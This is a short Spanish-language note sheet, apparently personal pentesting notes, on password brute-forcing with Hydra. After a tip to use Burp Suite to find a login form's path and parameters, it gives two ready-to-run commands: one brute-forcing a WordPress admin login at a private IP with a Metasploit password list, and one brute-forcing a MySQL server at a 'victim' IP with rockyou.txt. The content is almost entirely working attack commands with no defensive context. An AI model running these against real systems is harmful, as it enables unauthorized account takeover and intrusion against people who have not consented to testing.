
---

---

### Apoyarse con Burpsuite para ver la ruta a donde se tramita la peticion y ver los parametros de los forms
```bash
hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.168.3.215 http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:F=<ErrorMessage>'   
```

### Hydra - SQL

```bash
hydra -l username -P rockyou.txt mysql://<IpVictima>
```